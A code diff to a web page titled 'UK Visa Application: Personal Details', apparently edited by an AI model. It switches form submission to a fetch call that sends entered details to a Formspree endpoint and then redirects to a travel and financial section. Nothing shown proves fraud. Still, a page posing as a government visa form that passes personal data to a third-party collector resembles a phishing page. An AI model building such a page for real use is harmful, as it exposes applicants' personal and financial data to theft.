@@ -40,7 +40,7 @@
             <h2>UK Visa Application: Personal Details</h2>
             <p>Please provide accurate information. All fields marked with an asterisk (*) are mandatory.</p>
             
-            <form id="visaForm" action="https://formspree.io/f/xgvnbwzp" method="POST">
+            <form id="visaForm"> 
                 
                 <input type="hidden" name="_form_step" value="Personal_Details_Page">
                 
@@ -102,7 +102,6 @@
                 </fieldset>
 
                 <div class="form-footer">
-                    <input type="hidden" name="_next" value="travel_financial_section.html" />
                     <button type="submit" class="btn-main">Save & Continue to Next Section</button>
                     <p class="disclaimer">By continuing, you confirm the above details are accurate.</p>
                 </div>
@@ -111,9 +110,58 @@
     </main>
 
     <script>
-        // No custom JavaScript is needed here. 
-        // Formspree handles the submission and the hidden field '_next' handles the redirection 
-        // to 'travel_financial_section.html' upon successful submission.
+        // Formspree endpoint from user prompt
+        const FORMSPREE_URL = "https://formspree.io/f/xgvnbwzp";
+        const NEXT_PAGE_URL = "travel_financial_section.html";
+
+        document.getElementById('visaForm').addEventListener('submit', async function(event) {
+            // Stop the default browser submission (which prevents smooth redirection)
+            event.preventDefault(); 
+            
+            const form = event.target;
+
+            // Check if the form is valid (handles all 'required' attributes)
+            if (!form.checkValidity()) {
+                // If invalid, the browser will show its native error messages,
+                // but we add an alert as a backup.
+                alert('Please fill out all mandatory fields before proceeding.');
+                return;
+            }
+
+            const data = new FormData(form);
+            
+            // Show a temporary message while submitting data in the background
+            const submitButton = document.querySelector('.btn-main');
+            const originalButtonText = submitButton.textContent;
+            submitButton.disabled = true;
+            submitButton.textContent = 'Saving data...';
+            
+            try {
+                // Send the data asynchronously to Formspree
+                const response = await fetch(FORMSPREE_URL, {
+                    method: 'POST',
+                    body: data,
+                    headers: {
+                        'Accept': 'application/json'
+                    }
+                });
+
+                if (response.ok) {
+                    // Data saved successfully, now redirect the user
+                    window.location.href = NEXT_PAGE_URL;
+                } else {
+                    // Handle Formspree server error or non-200 response
+                    alert('Error submitting data. Please try again.');
+                }
+            } catch (error) {
+                // Handle network errors
+                alert('A network error occurred. Please check your connection.');
+            } finally {
+                // Reset button if redirection fails
+                submitButton.disabled = false;
+                submitButton.textContent = originalButtonText;
+            }
+        });
     </script>
     
     <footer>
